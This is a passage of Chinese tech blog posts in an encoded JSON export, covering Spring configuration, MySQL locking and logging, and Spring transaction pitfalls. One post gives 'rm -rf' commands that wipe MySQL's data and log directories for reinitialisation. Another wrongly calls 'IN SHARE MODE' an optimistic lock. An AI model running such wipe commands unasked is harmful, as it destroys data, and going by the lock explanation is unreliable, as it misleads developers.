&lt;&#x3D;&#x3D;&#x3D;&#x3D;要加载属性名为contextConfigLocation的入参数 &lt;param-value&gt;classpath:spring&#x2F;applicationContext.xml&lt;&#x2F;param-value&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;使用了配置applicationContext.xml作为入参的值&lt;&#x2F;context-param&gt;........&lt;&#x2F;web-app&gt; Web使用SpringMVC作为Servlet转发器关于Servlet的原始用法参考文章，然后我们把根目录映射到一个具有初始化参数对SpringMVC的类上 123456789101112131415161718192021&lt;web-app .....&gt;&lt;context-param&gt;...&lt;&#x2F;context-param&gt;&lt;servlet&gt; &lt;servlet-name&gt;springMvc&lt;&#x2F;servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;&#x2F;servlet-class&gt; &lt;init-param&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;根据英文翻译，就是设置初始化参数 &lt;param-name&gt;contextConfigLocation&lt;&#x2F;param-name&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;初始化名为contextConfigLocation的参数 &lt;param-value&gt;classpath:spring-mvc&#x2F;spring-mvc.xml&lt;&#x2F;param-value&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;参数的值为spring-mvc配置文件的路径 &lt;&#x2F;init-param&gt; &lt;load-on-startup&gt;1&lt;&#x2F;load-on-startup&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;设置启动顺序&lt;&#x2F;servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;springMvc&lt;&#x2F;servlet-name&gt; &lt;url-pattern&gt;&#x2F;&lt;&#x2F;url-pattern&gt;&lt;&#x2F;servlet-mapping&gt;&lt;&#x2F;web-app&gt; 最后给WebServlet服务起个名字最后我们给服务起个名字，一个基本生效的SpringMVC+Spring的WebServlet应用就完成了 1234567891011&lt;web-app .....&gt; &lt;display-name&gt;Web应用的名字&lt;&#x2F;display-name&gt; &lt;!--Spring上下文配置文件--&gt; &lt;context-param&gt;...&lt;&#x2F;context-param&gt; &lt;!-- Spring MVC servlet --&gt; &lt;servlet&gt;...&lt;&#x2F;servlet&gt; &lt;servlet-mapping&gt;...&lt;&#x2F;servlet-mapping&gt;&lt;&#x2F;web-app&gt; 配置中的classpath是什么以及其他标签关于Spring和SpringMVC的配置中有一个classpath字段是什么参考文章，以及除了基本标签外还可以使用 filter ：一些过滤器，比如Spring提供的编码解码过滤器等 error-page ： 错误页面的指向，比如常见的404错误页面用哪一个 jsp-config ： 一些JSP文件的简单配置","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"Configure","slug":"Configure","permalink":"http://yoursite.com/tags/Configure/"}]},{"title":"MySQL中的悲观锁和乐观锁","date":"2016-07-30T03:00:00.000Z","path":"2016/07/30/MySQL中的悲观锁和乐观锁/","text":"MySQL的锁Block所谓锁，就是锁定住某一部分，其他人都不许动，从类别上来讲分为三种，不同的引擎支持不一样 表锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发度最低。 行锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低，并发度也最高。 页锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般。 引擎 支持的锁 MyISAM 表级锁 BDB 表锁/页锁 InnoDB 表锁/页锁/行锁 乐观锁与悲观锁定义 乐观锁(Optimistic Lock): 就是很乐观，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据。 悲观锁(Pessimistic Lock): 就是很悲观，每次去拿数据的时候都认为别人会修改，所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会block直到它拿到锁。 悲观锁使用如果总觉得有刁民想害朕，就是用悲观锁，使用悲观锁有两个前提条件 必须是处于事务状态或者数据库配置关闭了Autocommit 使用特殊的SELECT语句 1SELECT ..... FOR UPDATE 在SELECT后加上 FOR UPDATE 就会进行加悲观锁，一旦加了悲观锁，其它事务的SELECT语句就会被刮起，直到加锁事务commit或者rollback结束事务 乐观锁的使用乐观锁的使用的前提条件同悲观锁，但是特殊的SELECT语句不同 1SELECT ..... IN SHARE MODE 在SELECT后加 IN SHARE MODE 就会进行加乐观锁 为什么要使用乐观锁和悲观锁在我们的业务逻辑中一般存在两种更新 状态的更新 数目的更新 我们以淘宝为例，常见的商品有三个状态：原价/半价/秒杀 以及商品的剩余数量，作为店家我操作商品会出现以下情况 状态的更新不管我对商品做了几次修改，当前商品都以最后一次修改为准，不关心之前修改了几次，这种是状态的更新 数目的更新而对于商品数量 如果0.01秒内有3个人同时买我的商品 我的商品还剩下2个 按照逻辑肯定有一个人会购买不成功 所以说我3个人购买前都要确认下商品是否还有剩余，因为0.01秒对于电脑来说可能根本分不出先后，如果不确认还有没有，很可能3个人都购买成功了，你却没货。 两种更新的操作状态的更新因为状态更新，只有你店家一个人操作，不太可能出现在0.01秒内切换3次状态的情况，所以说我们的SQL语句只需要 123456&#x2F;&#x2F;先看看当前的商品状态是什么SELECT status FROM taobao WHERE id&#x3D;&#39;101&#39;;&#x2F;&#x2F;根据业务层逻辑对当前的商品状态进行更新UPDATE TAOBAO SET status&#x3D;&#39;BANJIA&#39; WHERE id&#x3D;&#39;101&#39;; 数目的更新而商品数量的变化，很可能在你秒杀时有很多人再买。出现了只有2个存货，结果3个人同时买的情况。 1234567891011121314&#x2F;&#x2F;第一个人：查看当前的商品数量还有2个SELECT quantity FROM taobao WHERE id&#x3D;&#39;101&#39;;&#x2F;&#x2F;第一个人：剩余数量更改为1个UPDATE TAOBAO SET quantity&#x3D;&#39;1&#39; WHERE id&#x3D;&#39;101&#39;;&#x2F;&#x2F;第二个人：查看当前的商品数量还有1个SELECT quantity FROM taobao WHERE id&#x3D;&#39;101&#39;;&#x2F;&#x2F;第二个人：剩余数量更改为0个UPDATE TAOBAO SET quantity&#x3D;&#39;0&#39; WHERE id&#x3D;&#39;101&#39;;&#x2F;&#x2F;第三个人：查看当前的商品数量还有0个SELECT quantity FROM taobao WHERE id&#x3D;&#39;101&#39;;&#x2F;&#x2F;第三个人：购买失败 以上是应该执行的正确顺序，但是由于0.01秒时间实在是太短，很有可能数据库实际发生的情况是 1234567891011121314151617&#x2F;&#x2F;第一个人：查看当前的商品数量还有2个SELECT quantity FROM taobao WHERE id&#x3D;&#39;101&#39;;&#x2F;&#x2F;第二个人：查看当前的商品数量还有1个SELECT quantity FROM taobao WHERE id&#x3D;&#39;101&#39;;&#x2F;&#x2F;第一个人：剩余数量更改为1个UPDATE TAOBAO SET quantity&#x3D;&#39;1&#39; WHERE id&#x3D;&#39;101&#39;;&#x2F;&#x2F;第三个人：查看当前的商品数量还有0个SELECT quantity FROM taobao WHERE id&#x3D;&#39;101&#39;;&#x2F;&#x2F;第二个人：剩余数量更改为0个UPDATE TAOBAO SET quantity&#x3D;&#39;0&#39; WHERE id&#x3D;&#39;101&#39;;&#x2F;&#x2F;第三个人：购买成功UPDATE TAOBAO SET quantity&#x3D;&#39;－1&#39; WHERE id&#x3D;&#39;101&#39;; 可以发现 当第三个人查询商品剩余数量时，第二个人的更新还没有完成，所以会导致业务层认为还有剩余 所以要使用乐观锁和悲观锁根据上文分析 在状态更新时不管发生几次改变，都以最后一次为准，但是要记录改变的次数 在数量更新时第三个人的SELECT确保在第二个人UPDATE之后执行 那么 乐观锁 和 悲观锁 就是为了这样的两个需求而诞生的，但是不要忘记，前提是这两个锁都要 配合事务 进行操作","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"},{"name":"Transaction","slug":"Transaction","permalink":"http://yoursite.com/tags/Transaction/"}]},{"title":"MySQLWorkBench图形化数据库EER图","date":"2016-07-29T06:00:00.000Z","path":"2016/07/29/MySQLWorkBench图形化数据库EER图/","text":"MySQL WorkBenchMySQL除了使用命令行之外，还有很多GUI界面，最正统的就是MySQL WorkBench，虽然不一定是最好看的 数据库设计工具WorkBench可以采用EER图的方式帮助我们设计数据库，除了连接数据库外，我们可以先新建一个 Model 如图 然后在里面就有EER图的选项 打开之后是这个样子 SQL文件EER图的导入和导出除了手动绘制EER图之外，我们还可以将SQL文件导入成EER图，或者将EER图导出成SQL文件 导入在菜单栏 File-Import-Reverse Engineer MySQL Create Script 在导入时记得勾选 Place imported objects on a diagram 就会生成对应的EER图 PS：貌似Mac版本的WorkBench有内存泄漏，有时候导入会卡死 导出 File-Export 就可以看到各种各样的选项 其它好用的GUI客户端我个人觉得 Sequel Pro 这个客户端不错","tags":[{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"},{"name":"Tips","slug":"Tips","permalink":"http://yoursite.com/tags/Tips/"}]},{"title":"MySQL查看数据库操作记录","date":"2016-07-28T07:00:00.000Z","path":"2016/07/28/MySQL查看数据库操作记录/","text":"开启操作记录日志首先进入mysql输入指令 1show variables like &#39;gen%&#39;; 可以看到输出 123456+------------------+-------------------------------------+| Variable_name | Value |+------------------+-------------------------------------+| general_log | OFF || general_log_file | &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;localhost.log |+------------------+-------------------------------------+ 可以看到general_log是开启还是环比状态，以及这个帐号的general_log文件在哪，设置开启 12set global general_log&#x3D;ON;commit;&#x2F;&#x2F;如果关闭了自动提交，记得commit一次结束事务 然后就可以去general_log_file的路径查看操作记录了 采用数据库内部查看出了可以用日志文件的形式查看数据库操作记录之外，也可以把日志作为一个表单，在数据库内部查看 12show variables like &#39;%log_output%&#39;; 可以看到输出，然后将其改为表单 1234567+---------------+-------+| Variable_name | Value |+---------------+-------+| log_output | FILE |+---------------+-------+set global log_output&#x3D;&#39;TABLE&#39;; 之后就可以通过以下两句话查看数据库操作记录 123select * from mysql.general_log; &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;查看操作记录truncate table mysql.general_log; &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;清空操作记录表单","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"MySQL如何重新初始化数据库","date":"2016-07-28T06:00:00.000Z","path":"2016/07/28/MySQL如何重新初始化数据库/","text":"MySQL如何重新初始化MySQL重新初始化需要以下步骤 干掉日志目录删除 undolog 和 redolog 里的所有内容，包括隐藏内容 123rm -rf &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;undolog&#x2F;* &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;redolog&#x2F;* 干掉数据目录干掉Data里的所有内容，不然会提示Data已存在不能重新初始化 12rm -rf &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;* 重新设置错误日志把error.log在配置文件里放在一个不在以上三个目录的地址，例如 1log_error &#x3D; &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;error.log 重新执行初始化函数重新执行初始化函数之后，和第一次初始化不同，看不到任何提示信息，所以更别提5.7的初始密码 哪里查看初始化密码去错误日志 error.log 中可以看到重新初始化生成的初始密码，第二次初始化不会把新的密码写入 /root/.mysql_secret","tags":[{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"给SLF4J的日志添加TRACE_ID","date":"2016-07-27T09:30:00.000Z","path":"2016/07/27/给SLF4J的日志添加TRACEID/","text":"为什么要添加ID在文章通过日志检查事务是否开启中我们提到了可以通过日志查看日志有没有开启，有个问题是不清楚哪一行日志到底是哪个事务的，在高并发的时候会产生找不到对应日志的问题 slf4j的小工具我们可以设置一个字段 Constants.TRACE_LOG_ID = “TRACE_LOG_ID” 然后通过sjf4j的MDC单例放入一个随机字符串 12345678910import org.slf4j.MDC;import java.util.UUID;public class LogUtil &#123; public static void traceLogId() &#123; MDC.put(Constants.TRACE_LOG_ID, UUID.randomUUID().toString()); &#125;&#125; 日志配置文件中设置可以使用自定义关键字 %X{TRACE_LOG_ID} 就可以追踪到日志的ID了 12345678&lt;appender name&#x3D;&quot;STDOUT&quot; class&#x3D;&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt; &lt;encoder charset&#x3D;&quot;utf-8&quot;&gt; &lt;!-- encoder 可以指定字符集，对于中文输出有意义 --&gt; &lt;!-- %.-1level 只显示信息级别的首字母,%-5level 左对齐显示信息级别全称 --&gt; &lt;!-- 如需自定义关键字，用 %mdc&#123;键名&#125; 表示,程序中用MDC.put(&quot;键名&quot;,&quot;键值&quot;)设置，可动态设置 [%logger:%line]--&gt; &lt;Pattern&gt;[%date&#123;yyyy-MM-dd HH:mm:ss&#125;][%thread][%-5level] %c&#123;40&#125; %line --%mdc&#123;client&#125; [%X&#123;TRACE_LOG_ID&#125;] %msg%n&lt;&#x2F;Pattern&gt; &lt;&#x2F;encoder&gt;&gt;&lt;&#x2F;appender&gt; 在需要追踪的方法内调用在需要追踪的方法里调用，由该方法产生的日志就会被放入一个随机的ID 1234567public int methodExample(String updateColumn) throws Exception &#123; LogUtil.traceLogId(); ..... &#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Log","slug":"Log","permalink":"http://yoursite.com/tags/Log/"}]},{"title":"通过日志检查事务是否开启","date":"2016-07-27T09:00:00.000Z","path":"2016/07/27/通过日志检查事务是否开启/","text":"如何配置JDBC日志在检查Spring和SpringMVC配置冲突导致事务无法开启和反射调用事务方法导致事务失效引起的异常中，怎么查原因都查不到，最后在同事的介绍下，帮我配置了下数据库日志，可以看到事务是否真的被开启了 用到的组件打印日志用的是 SLF4J 和 jdbcdslog 其Maven配置如下 123456789101112131415161718192021222324252627&lt;!--slf4j--&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;&#x2F;groupId&gt; &lt;artifactId&gt;slf4j-api&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;slf4j.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jcl-over-slf4j&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;slf4j.version&#125;&lt;&#x2F;version&gt; &lt;scope&gt;runtime&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;&#x2F;groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;slf4j.version&#125;&lt;&#x2F;version&gt; &lt;scope&gt;runtime&lt;&#x2F;scope&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.googlecode.usc&lt;&#x2F;groupId&gt; &lt;artifactId&gt;jdbcdslog&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0.6.2&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; Slf4j的配置配置文件为logback.xml 由于不是太熟悉，我采用的是以下配置 1234567891011121314151617181920212223242526&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;configuration&gt; &lt;!-- 管控台日志打印，发布生产需注释 --&gt; &lt;appender name&#x3D;&quot;STDOUT&quot; class&#x3D;&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt; &lt;encoder charset&#x3D;&quot;utf-8&quot;&gt; &lt;!-- encoder 可以指定字符集，对于中文输出有意义 --&gt; &lt;!-- %.-1level 只显示信息级别的首字母,%-5level 左对齐显示信息级别全称 --&gt; &lt;!-- 如需自定义关键字，用 %mdc&#123;键名&#125; 表示,程序中用MDC.put(&quot;键名&quot;,&quot;键值&quot;)设置，可动态设置 [%logger:%line]--&gt; &lt;Pattern&gt;[%date&#123;yyyy-MM-dd HH:mm:ss&#125;][%thread][%-5level] %c&#123;40&#125; %line --%mdc&#123;client&#125; [%X&#123;TRACE_LOG_ID&#125;] %msg%n&lt;&#x2F;Pattern&gt; &lt;&#x2F;encoder&gt;&gt; &lt;&#x2F;appender&gt; &lt;!-- 外部jar包 日志级别设置 --&gt; &lt;logger level&#x3D;&quot;INFO&quot; name&#x3D;&quot;com.ibatis&quot; &#x2F;&gt; &lt;logger level&#x3D;&quot;INFO&quot; name&#x3D;&quot;org.springframework&quot;&#x2F;&gt; &lt;logger level&#x3D;&quot;INFO&quot; name&#x3D;&quot;java.sql&quot;&#x2F;&gt; &lt;logger level&#x3D;&quot;INFO&quot; name&#x3D;&quot;org.jdbcdslog&quot;&#x2F;&gt; &lt;!-- 输出到控制台和文件，可定义更多的 Appender --&gt; &lt;root level&#x3D;&quot;DEBUG&quot; &gt; &lt;appender-ref ref&#x3D;&quot;STDOUT&quot;&#x2F;&gt; &lt;&#x2F;root&gt;&lt;&#x2F;configuration&gt; 事务状态和非事务状态的日志这样在创建Sql的时候就可以看到事务日志和非事务日志的区别，由于我DAL层使用的是MyBatis，看到的是以下日志 为了方便追踪最好给日志加上ID，参考这里给日志添加TraceID 事务状态1234[2016-07-28 23:17:20][qtp151784151-26][DEBUG] org.mybatis.spring.SqlSessionUtils 120 -- [] Registering transaction synchronization for SqlSession [org.apache.ibatis.session.defaults.DefaultSqlSession@2ac108c2]......[2016-07-28 23:17:20][qtp151784151-26][DEBUG] org.mybatis.spring.SqlSessionUtils 163 -- [] Releasing transactional SqlSession [org.apache.ibatis.session.defaults.DefaultSqlSession@2ac108c2] 非事务状态1234[2016-07-28 23:20:12][qtp151784151-25][DEBUG] org.mybatis.spring.SqlSessionUtils 140 -- [] SqlSession [org.apache.ibatis.session.defaults.DefaultSqlSession@51bdc159] was not registered for synchronization because synchronization is not active.......[2016-07-28 23:20:12][qtp151784151-25][DEBUG] org.mybatis.spring.SqlSessionUtils 168 -- [] Closing non transactional SqlSession [org.apache.ibatis.session.defaults.DefaultSqlSession@51bdc159]","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"},{"name":"Transaction","slug":"Transaction","permalink":"http://yoursite.com/tags/Transaction/"},{"name":"Log","slug":"Log","permalink":"http://yoursite.com/tags/Log/"}]},{"title":"反射调用事务方法导致事务失效","date":"2016-07-27T08:00:00.000Z","path":"2016/07/27/反射调用事务方法导致事务失效/","text":"反射调用事务方法导致事务失效本文部分作废，可以使用反射调用事务方法，但是需要Invoke的Object不同，参考新文章 不能使用反射方法去调用加了Transactional注解的方法，不然事务会失效 我为什么会作死以及我怎么作死的在文章SpringMVC和Spring配置冲突的文章的假设中，我的Web层采用了这样一种作死的方式调用Service层 因为存在模型转换，我有好多个函数要写，又没有人帮我写，每次复制粘贴好烦 所有函数有都是一样多参数，仅仅是函数名不同 我就作死的使用同一个反射函数，传入不同的Key，Key＝函数名，来调用Service这些函数，类似 12345678@Autowiredprivate SomeService someService;@Overridepublic void insert(ObjectReqVO objectReqVO) &#123; String key &#x3D; &quot;serviceInsertMethod&quot;; ReflectUtil.invokeMethod(objectReqVO,someService,key);&#125; 然而在Service层的 serviceInsertMethod 是如何实现的呢 12345@Override@Transactional(isolation &#x3D; Isolation.DEFAULT,propagation &#x3D; Propagation.REQUIRED,rollbackFor &#x3D; Exception.class)public void serviceInsertMethod(ObjectReqBO objectReqBO) &#123;&#125; 我作死中遇到了什么问题(此处有误)有对Spring事务有一定了解的人都知道其实现原理是JDK的动态代理，如果某方法被加了注解，那么 ReflectUtil.invokeMethod 中得到一个名为Proxy@XXX的动态代理类，而不是 SomeService 类本身 参考如何从动态代理中取Target中我们可以知道，如果想用反射方法获得Method(例如serviceInsertMethod)和Field必须取出Target(例如SomeService) Spring为了帮你完成事务给你加了动态代理，你为了使用反射给它拆开了，Spring就不能帮你进行事务管理了啊！！！！！ 解决方法(此处有误)呃。。。没有找到，所以调用有@Transactional的方法，还是老老实实的调用吧 1234public void insert(ObjectReqVO objectReqVO) &#123; ObjectReqBO objectReqBO ＝ BeanUtil.objectConvert(objectReqVO,ObjectReqBO.class); someService.serviceInsertMethod(objectReqBO);&#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"},{"name":"Reflect","slug":"Reflect","permalink":"http://yoursite.com/tags/Reflect/"},{"name":"Transaction","slug":"Transaction","permalink":"http://yoursite.com/tags/Transaction/"},{"name":"Error","slug":"Error","permalink":"http://yoursite.com/tags/Error/"}]},{"title":"Spring和SpringMVC配置冲突导致事务无法开启","date":"2016-07-27T07:00:00.000Z","path":"2016/07/27/Spring和SpringMVC配置冲突导致事务无法开启/","text":"Spring和SpringMVC配置冲突导致事务无法开启本文原因已经找到，参考文章[最少依赖启动SSM][plus][plus]:http://alanli7991.github.io/2016/11/01/从空Pom文件用最少依赖配置SSM框架/ Spring和SpringMVC并不是同一个东西，虽然都是一个公司出的，但是配置上也会冲突导致事务失效 Spring的配置文件 SpringMVC的配置文件 产生冲突的原因根据配置文件的讲解，必不可少的是扫描component，这里就牵扯到一个问题SpringMVC和Spring都会进行扫描，那谁先谁后呢？ SpringMVC先于Spring进行扫描 我们假设这样的一种情况 后台分层 所用包名 所用组件 所用注解 Web层 com.company.project.web SpringMVC @Controller Service层 com.company.project.service Spring @Service DAL层 com.company.project.dal MyBatis 无 根据文章Spring的四个注解解释，@Controller和@Service没有实质上的区别，假如我们使用 com.company.project 作为基础包名配置Spring和SpringMVC就会导致事务失效 会导致失效的SpringMVC的配置1234567&lt;beans .......&gt; &lt;!-- 进行component扫描 --&gt; &lt;context:component-scan base-package&#x3D;&quot;com.company.project.*&quot;&#x2F;&gt; .......&lt;&#x2F;beans&gt; 会导致失效的Spring的配置1234567&lt;beans .....&gt; &lt;!-- 进行component扫描 --&gt; &lt;context:component-scan base-package&#x3D;&quot;com.company.project.*&quot;&#x2F;&gt; .....&lt;&#x2F;beans&gt; 推测导致失效的原因 因为Tomcat等容器扫描web.xml的时候有先后顺序，推测是先扫描Servlet然后再扫描Context(大概，不确定) 使用以上配置导致Servlet加载Component的时候，把Service层的Service也进行了实例化，并且对其加了一系列动态代理 由于单例模式的原因，导致Context配置无法自己加载Component而是拿到的Servlet实例化的Component的指针 由于没有由Context进行实例化，导致Spring对Context内容的动态代理无法加载 以上原因是我猜的，也没有验证，因为我在反射问题里也遇到了一个类似的问题导致事务失效 解决事务失效的方法通过面向百度和Google编程，得到了采用 配置文件中互相排除多余的注解 来防止事务失效 正确的SpringMVC配置在Servlet中不扫描Service的注解 12345678&lt;beans .......&gt; &lt;context:component-scan base-package&#x3D;&quot;com.company.project.*&quot;&gt; &lt;context:exclude-filter type&#x3D;&quot;annotation&quot; expression&#x3D;&quot;org.springframework.stereotype.Service&quot;&#x2F;&gt; &lt;&#x2F;context:component-scan&gt; .......&lt;&#x2F;beans&gt; 正确的Spring配置在Context中不扫描Controller的注解 12345678&lt;beans .......&gt; &lt;context:component-scan base-package&#x3D;&quot;com.company.project.*&quot;&gt; &lt;context:exclude-filter type&#x3D;&quot;annotation&quot; expression&#x3D;&quot;org.springframework.stereotype.Controller&quot;&#x2F;&gt; &lt;&#x2F;context:component-scan&gt; .......&lt;&#x2F;beans&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"},{"name":"Configure","slug":"Configure","permalink":"http://yoursite.com/tags/Configure/"},{"name":"Transaction","slug":"Transaction","permalink":"http://yoursite.com/tags/Transaction/"}]},{"title":"Transaction事务的本质和解析","date":"2016-07-27T06:00:00.000Z","path":"2016/07/27/Transaction事务的本质和解析/","text":"事务是什么第一次接触事务的概念，来自于慕课网的教程Spring中的事务，从该教程中可以得知事务分为 编程式事务 配置式事务 注解式事务 其中编程式事务和配置式事务相对来讲用的比较少，注解式事务比较常见，但是不管是哪一种都保持着事务的本性 一组数据库操作，要么全部成功，要么全部失败 ps:教程中也是以转账进行的举例，Transaction本来的含义就是转移和转账，我感觉这个概念的提出就是为了解决 数据的移动 只不过后来慢慢对 一组动作的原子性 有了明确的定义，才翻译成事务 事务如何进行逻辑控制玩过游戏的都知道有个必杀技叫S/L大法,事务说白了就是存档/读档，也和Git的概念十分相似。那么我就通俗的讲下如何进行逻辑控制 以S/L大法进行举例数据库的存档叫Commit，数据库的读档叫做Rollback，一旦通过3种方式中任何一个开启事务，将进行以下逻辑操作 游戏逻辑 数据库逻辑 卧槽前面有个BOSS可能打不过 转账操作，可能不能顺利完成 打之前存一下 数据库进行Commit 开始打BOSS 数据库开启事务，进行转账 BOSS挂了，赶紧存一下，别停电了还要重新打 再次Commit结束事务，数据库更变为新状态 你挂了，胜败乃兵家常事，大侠请从新来过 事务发生异常 卧槽，用了三个道具还没打过，赶紧读档，不然这三个道具浪费了 进行回滚Rollback结束事务，数据库保持旧状态 以Git进行举例巧合的是Git中也有Commit指令，就是对当前的状态进行快照，如果代码写乱了还可以进行Discard和Rollback操作，只不过 事务的Rollback ＝ Git的Discard Git的逻辑 数据库的逻辑 这代码好狗屎，我要重构它，但是又怕出问题 有个转账交易，不知道能不能成功 先Commit保存一下 先保存当前数据库状态Commit 重构代码 数据库开启事务，进行转账操作 重构的完毕，竟然没BUG，赶快再次Commit 再次Commit结束事务，数据库更变为新状态 卧槽，这是什么意思，卧槽，为什么我这个值有问题，怎么跑不起来了 事务发生异常 卧槽，算了，别给自己找不自在了，还是用旧代码吧，Discard All 进行回滚Rollback结束事务，数据库保持旧状态 事务的传播性和隔壁级别事务的传播性和隔离级别理解起来比较晦涩，还牵扯到数据库的脏读/不可重复读/幻读，需要在实际编程中自己理解，这里仅仅提醒下比较容易混淆的概念 传播性中”支持” 事务隔离级别 名次解释 PROPAGATION_REQUIRED 如果存在一个事务，则支持当前事务。如果没有事务则开启 PROPAGATION_SUPPORTS 如果存在一个事务，支持当前事务。如果没有事务，则非事务的执行 PROPAGATION_NOT_SUPPORTED 总是非事务地执行，并挂起任何存在的事务 PROPAGATION_NESTED 如果一个活动的事务存在，则运行在一个嵌套的事务中. 如果没有活动事务，按PROPAGATION_REQUIRED 属性执行 这里好多人都是复制过来复制过去，其中最让人难以理解的是 支持当前事务 这是个什么鬼。。。 Speak In Chinese 应该是说 不会对当前事务产生影响 ，所谓产生影响是指不会像 PROPAGATION_NOT_SUPPORTED 一样把另外一个事务暂停，也不会像 PROPAGATION_NESTED 一样，因为自己事务出错，连累另外一个正在运行对事务一起回滚 脏读/不可重复读/幻读这三个坑爹的名次是英文直译，比较容易让人晕，这里列个表区别下 脏读和不可重复读 相同点 不同点 读数据的时候，被人改了 脏读是只读一次，不可重复读读了多次 不可重复读和幻读 相同点 不同点 都是读取多次 两次读的内容不一样是不可重复读，两次读的条数不一样(有增删操作)是幻读 流程模拟12345678910111213事务1：更新一条数据 -------------&gt;事务2：读取事务1更新的记录(事务2脏读)事务1：调用commit进行提交事务1：查询一条记录 --------------&gt;事务2：更新事务1查询的记录 --------------&gt;事务2：调用commit进行提交事务1：再次查询上次的记录（事务1不可重复读）事务1：查询表中所有记录 --------------&gt;事务2：插入一条记录 --------------&gt;事务2：调用commit进行提交事务1：再次查询表中所有记录(事务1幻读) Spring的事务和数据库的事务的区别在了解了事务的工作机制，好多人都会产生一个疑问，Spring中也有事务，数据库也有事务，他们的区别和联系是什么？这里首先明确一个概念 事务是一个仅仅存在于数据库的概念，Spring的事务本质也是数据库进行的 如何链接到数据库在我们想要通过某种方式（比如客户端）连接到数据库时，需要知道以下的属性 IP地址 端口 帐号 密码 既然有了IP地址和端口号，这分明就是IP协议嘛，所以说 无论以何种方式接入数据库，都是基于传输层的TCP/IP协议 正式由于如此，除了通过设定好的IP和端口链接数据库，也可以使用某个Socket，详细参见Sokcet与TCP/IP的关系 Spring如何连接到数据库在Spring的事务中，必须配置的类是 transactionManager 它有一个属性叫 datasource，而datasource又是一个jdbc的数据源，我们通过配置datasource的URL可以知道 1jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;database 是不是感觉和 http://xxxx 有种似曾相识的感觉，所以说Spring在 连接到数据库之后,使用了应用层的jdbc:mysql:协议 对数据库进行操作 Spring操作数据库这样以来也就不难发现，所谓Spring的事务——其实就是Spring通过与数据库的链接，使用某种应用层协议操作数据库事务本身 除了Spring可以操作数据库的事务以外，MyBatis，Hibernate，Jdbc等等都有事务的概念，但是它们同Spring一样 仅仅是操作数据库 事务实际逻辑运行的地方，还是数据库本身 Spring事务的坑我在编程中碰到过两次大坑导致事务失效 SpringMVC和Spring配置冲突导致事务无法开启 通过反射调用事务方法导致事务失效 在填坑之前，首先看看如何检查事务是否正常开启","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"},{"name":"Transaction","slug":"Transaction","permalink":"http://yoursite.com/tags/Transaction/"}]},{"title":"Jetty后台启动","date":"2016-07-24T09:30:00.000Z","path":"2016/07/24/Jetty后台启动/","text":"Jetty后台启动除了使用以下命令启动外 1[root@localhost jetty]# java -jar 